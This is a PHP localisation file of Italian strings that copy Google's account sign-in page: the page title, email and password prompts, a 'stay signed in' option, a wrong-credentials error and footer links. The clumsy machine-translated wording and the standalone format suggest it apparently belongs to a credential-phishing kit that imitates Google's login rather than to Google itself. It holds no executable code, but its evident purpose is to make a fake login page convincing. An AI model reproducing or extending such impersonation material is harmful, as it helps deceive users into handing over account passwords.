<?php
/*
------------------
Language: iTalia
------------------
*/
 
$lang = array();
// Header 
$lang['TITTLE'] = 'Accedi - Account Google';
$lang['SIGN_IN'] = 'Accedi';
$lang['CONT_GMAIL'] = 'di continuare a Gmail';
$lang['PASSWORD'] = 'Parola d&#39;ordine';
$lang['EMAIL'] = 'Email o telefono';
$lang['NEXT'] = 'Il prossimo';
$lang['SIGN'] = 'Accedi';
$lang['FORGOT'] = 'Ha dimenticato la password?';
$lang['ERROR'] = 'nome utente e password errati';

//Google Log in
$lang['ONE'] = 'Un account. Tutto Google.';
$lang['SIGN_WITH'] = 'Accedi con il tuo account Google';
$lang['STAY'] = 'Resta connesso';
$lang['KEEP_CHECKED'] = 'Per tua comodità, tienilo selezionato. Sui dispositivi condivisi, si raccomandano ulteriori precauzioni.';
$lang['SIGN_DIFFERENT'] = 'Accedi con un altro account';
$lang['EVERYTHING'] = 'Un account Google per tutto ciò che Google';
$lang['ABOUT'] = 'Informazioni su Google';
$lang['PRIVACY'] = 'vita privata';
$lang['TERM'] = 'condizioni';
$lang['HELP'] = 'Aiuto';
$lang['FIND_ACCOUNT'] = 'Trova il mio account';
$lang['CREATE'] = 'Creare un profilo';
?>